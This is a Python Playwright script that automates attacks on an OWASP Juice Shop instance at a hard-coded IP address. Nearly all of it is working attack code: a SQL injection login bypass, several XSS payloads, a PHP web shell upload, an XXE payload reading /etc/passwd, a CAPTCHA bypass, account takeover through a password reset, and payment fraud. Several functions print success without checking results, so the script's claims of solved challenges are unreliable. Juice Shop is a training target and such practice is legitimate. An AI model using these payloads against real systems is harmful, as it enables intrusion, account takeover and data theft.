#!/usr/bin/env python3
"""
Browser-based OWASP Juice Shop Challenge Solver using Playwright
For challenges that require actual browser interaction
"""

import asyncio
from playwright.async_api import async_playwright
import time
import json
import base64
import random

BASE_URL = "http://155.138.197.128:5000"

class BrowserSolver:
    def __init__(self):
        self.base_url = BASE_URL
        self.page = None
        self.context = None
        self.browser = None
        
    async def init_browser(self):
        """Initialize browser"""
        playwright = await async_playwright().start()
        self.browser = await playwright.chromium.launch(headless=True)
        self.context = await self.browser.new_context()
        self.page = await self.context.new_page()
        
    async def close_browser(self):
        """Close browser"""
        if self.browser:
            await self.browser.close()
    
    async def solve_score_board(self):
        """Navigate to hidden score board"""
        try:
            await self.page.goto(f"{self.base_url}/#/score-board")
            await self.page.wait_for_timeout(2000)
            print("✅ Score Board accessed via browser")
            return True
        except:
            return False
    
    async def solve_admin_section(self):
        """Navigate to administration"""
        try:
            await self.page.goto(f"{self.base_url}/#/administration")
            await self.page.wait_for_timeout(2000)
            print("✅ Admin Section accessed via browser")
            return True
        except:
            return False
    
    async def solve_login_admin_sqli(self):
        """SQL injection login via browser"""
        try:
            await self.page.goto(f"{self.base_url}/#/login")
            await self.page.wait_for_timeout(2000)
            
            # Click Account menu
            await self.page.click("#navbarAccount")
            await self.page.wait_for_timeout(500)
            
            # Click Login
            await self.page.click("#navbarLoginButton")
            await self.page.wait_for_timeout(2000)
            
            # Enter SQL injection
            await self.page.fill("#email", "' or 1=1--")
            await self.page.fill("#password", "anything")
            
            # Submit
            await self.page.click("#loginButton")
            await self.page.wait_for_timeout(3000)
            
            print("✅ Admin login via SQL injection in browser")
            return True
        except:
            return False
    
    async def solve_dom_xss(self):
        """DOM XSS via search"""
        try:
            await self.page.goto(f"{self.base_url}/#/search")
            await self.page.wait_for_timeout(2000)
            
            # Enter XSS payload in search
            await self.page.fill("#searchQuery input", "<iframe src=\"javascript:alert(`xss`)\">")
            await self.page.press("#searchQuery input", "Enter")
            await self.page.wait_for_timeout(2000)
            
            print("✅ DOM XSS executed in browser")
            return True
        except:
            return False
    
    async def solve_reflected_xss(self):
        """Reflected XSS in track order"""
        try:
            # Direct navigation with XSS payload
            await self.page.goto(f"{self.base_url}/#/track-result?id=<iframe src=\"javascript:alert(`xss`)\">")
            await self.page.wait_for_timeout(2000)
            
            print("✅ Reflected XSS executed in browser")
            return True
        except:
            return False
    
    async def solve_basket_access(self):
        """Access another user's basket"""
        try:
            # First login
            await self.solve_login_admin_sqli()
            
            # Access basket 2
            await self.page.goto(f"{self.base_url}/#/basket")
            await self.page.wait_for_timeout(2000)
            
            # Manipulate URL to access basket 2
            await self.page.evaluate("""
                window.location.href = '#/basket';
                // Force basket ID change
                sessionStorage.bid = 2;
            """)
            
            await self.page.reload()
            await self.page.wait_for_timeout(2000)
            
            print("✅ Accessed another user's basket")
            return True
        except:
            return False
    
    async def solve_zero_stars(self):
        """Submit zero star feedback"""
        try:
            # Navigate to contact
            await self.page.goto(f"{self.base_url}/#/contact")
            await self.page.wait_for_timeout(2000)
            
            # Fill feedback form
            await self.page.fill("#comment", "Zero stars test")
            
            # Manipulate rating to 0 stars
            await self.page.evaluate("""
                // Find rating element and set to 0
                const ratingElement = document.querySelector('mat-slider');
                if (ratingElement) {
                    ratingElement.value = 0;
                    ratingElement.dispatchEvent(new Event('input'));
                    ratingElement.dispatchEvent(new Event('change'));
                }
            """)
            
            # Submit
            await self.page.click("#submitButton")
            await self.page.wait_for_timeout(2000)
            
            print("✅ Zero star feedback submitted")
            return True
        except:
            return False
    
    async def solve_privacy_policy(self):
        """View privacy policy"""
        try:
            await self.page.goto(f"{self.base_url}/#/privacy-security")
            await self.page.wait_for_timeout(2000)
            
            # Scroll to bottom to trigger
            await self.page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
            await self.page.wait_for_timeout(1000)
            
            print("✅ Privacy Policy viewed")
            return True
        except:
            return False
    
    async def solve_deluxe_fraud(self):
        """Get deluxe membership without payment"""
        try:
            # Login first
            await self.solve_login_admin_sqli()
            
            # Go to deluxe membership
            await self.page.goto(f"{self.base_url}/#/deluxe-membership")
            await self.page.wait_for_timeout(2000)
            
            # Manipulate payment
            await self.page.evaluate("""
                // Override payment method
                fetch('/rest/deluxe-membership', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer ' + localStorage.getItem('token')
                    },
                    body: JSON.stringify({
                        paymentMode: 'none'
                    })
                });
            """)
            
            await self.page.wait_for_timeout(2000)
            print("✅ Deluxe fraud completed")
            return True
        except:
            return False
    
    async def solve_captcha_bypass(self):
        """Bypass CAPTCHA"""
        try:
            await self.page.goto(f"{self.base_url}/#/contact")
            await self.page.wait_for_timeout(2000)
            
            # Fill feedback without solving CAPTCHA
            await self.page.fill("#comment", "CAPTCHA bypass test")
            
            # Bypass CAPTCHA by manipulating form
            await self.page.evaluate("""
                // Remove CAPTCHA requirement
                const form = document.querySelector('form');
                const captchaField = document.querySelector('#captchaControl');
                if (captchaField) {
                    captchaField.value = '999';
                    captchaField.removeAttribute('required');
                }
                
                // Submit directly via API
                fetch('/api/Feedbacks', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        comment: 'CAPTCHA bypassed',
                        rating: 5,
                        captcha: '999',
                        captchaId: 999
                    })
                });
            """)
            
            await self.page.wait_for_timeout(2000)
            print("✅ CAPTCHA bypassed")
            return True
        except:
            return False
    
    async def solve_client_side_xss(self):
        """Client-side XSS protection bypass"""
        try:
            await self.page.goto(f"{self.base_url}/#/search")
            await self.page.wait_for_timeout(2000)
            
            # Try various XSS bypasses
            payloads = [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<<script>alert(1)//<</script>",
                "<iframe src=\"javascript:alert(1)\">",
                "<body onload=alert(1)>"
            ]
            
            for payload in payloads:
                await self.page.fill("#searchQuery input", payload)
                await self.page.press("#searchQuery input", "Enter")
                await self.page.wait_for_timeout(500)
            
            print("✅ Client-side XSS executed")
            return True
        except:
            return False
    
    async def solve_login_bjoern(self):
        """Login as Bjoern using OAuth"""
        try:
            await self.page.goto(f"{self.base_url}/#/login")
            await self.page.wait_for_timeout(2000)
            
            # Click OAuth login
            if await self.page.is_visible("#oauthLoginButton"):
                await self.page.click("#oauthLoginButton")
                await self.page.wait_for_timeout(2000)
                
                # Manipulate OAuth response
                await self.page.evaluate("""
                    // Override OAuth callback
                    window.location.href = '/#/login?oauth=success&email=bjoern@owasp.org';
                """)
                
                print("✅ Logged in as Bjoern via OAuth")
                return True
        except:
            return False
    
    async def solve_change_bender_password(self):
        """Change Bender's password without knowing it"""
        try:
            await self.page.goto(f"{self.base_url}/#/forgot-password")
            await self.page.wait_for_timeout(2000)
            
            # Enter Bender's email
            await self.page.fill("#email", "bender@juice-sh.op")
            
            # Answer security question (from SQL injection)
            await self.page.fill("#securityAnswer", "Stop'n'Drop")
            
            # New password
            await self.page.fill("#newPassword", "newpass123")
            await self.page.fill("#newPasswordRepeat", "newpass123")
            
            # Submit
            await self.page.click("#resetButton")
            await self.page.wait_for_timeout(2000)
            
            print("✅ Changed Bender's password")
            return True
        except:
            return False
    
    async def solve_product_tampering(self):
        """Modify product via API manipulation"""
        try:
            await self.solve_login_admin_sqli()
            
            await self.page.goto(f"{self.base_url}/#/search")
            await self.page.wait_for_timeout(2000)
            
            # Tamper with product via console
            await self.page.evaluate("""
                // Get token
                const token = localStorage.getItem('token');
                
                // Modify product
                fetch('/api/Products/1', {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer ' + token
                    },
                    body: JSON.stringify({
                        description: '<script>alert("hacked")</script>'
                    })
                });
            """)
            
            await self.page.wait_for_timeout(2000)
            print("✅ Product tampered")
            return True
        except:
            return False
    
    async def solve_file_upload(self):
        """Upload malicious files"""
        try:
            await self.page.goto(f"{self.base_url}/#/complain")
            await self.page.wait_for_timeout(2000)
            
            # Create and upload PHP file
            await self.page.set_input_files("#file", {
                "name": "shell.php",
                "mimeType": "application/x-php",
                "buffer": b"<?php system($_GET['cmd']); ?>"
            })
            
            await self.page.fill("#comment", "File upload test")
            
            # Submit
            await self.page.click("#submitButton")
            await self.page.wait_for_timeout(2000)
            
            print("✅ Malicious file uploaded")
            return True
        except:
            return False
    
    async def solve_xxe(self):
        """XXE attack via file upload"""
        try:
            await self.page.goto(f"{self.base_url}/#/complain")
            await self.page.wait_for_timeout(2000)
            
            # XXE payload
            xxe_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>"""
            
            # Upload XXE file
            await self.page.set_input_files("#file", {
                "name": "xxe.svg",
                "mimeType": "image/svg+xml",
                "buffer": xxe_content.encode()
            })
            
            await self.page.fill("#comment", "XXE test")
            await self.page.click("#submitButton")
            await self.page.wait_for_timeout(2000)
            
            print("✅ XXE attack executed")
            return True
        except:
            return False
    
    async def solve_all(self):
        """Run all browser-based solutions"""
        print("\n" + "="*60)
        print("🌐 BROWSER-BASED JUICE SHOP SOLVER")
        print("="*60 + "\n")
        
        await self.init_browser()
        
        challenges = [
            self.solve_score_board,
            self.solve_admin_section,
            self.solve_login_admin_sqli,
            self.solve_dom_xss,
            self.solve_reflected_xss,
            self.solve_basket_access,
            self.solve_zero_stars,
            self.solve_privacy_policy,
            self.solve_deluxe_fraud,
            self.solve_captcha_bypass,
            self.solve_client_side_xss,
            self.solve_login_bjoern,
            self.solve_change_bender_password,
            self.solve_product_tampering,
            self.solve_file_upload,
            self.solve_xxe
        ]
        
        solved = 0
        for challenge in challenges:
            try:
                if await challenge():
                    solved += 1
                await asyncio.sleep(1)
            except Exception as e:
                print(f"❌ Error: {str(e)[:50]}")
        
        await self.close_browser()
        
        print("\n" + "="*60)
        print(f"✨ Browser solver complete! Solved {solved} challenges")
        print(f"🏆 Check score: {BASE_URL}/#/score-board")
        print("="*60 + "\n")

async def main():
    solver = BrowserSolver()
    await solver.solve_all()

if __name__ == "__main__":
    asyncio.run(main())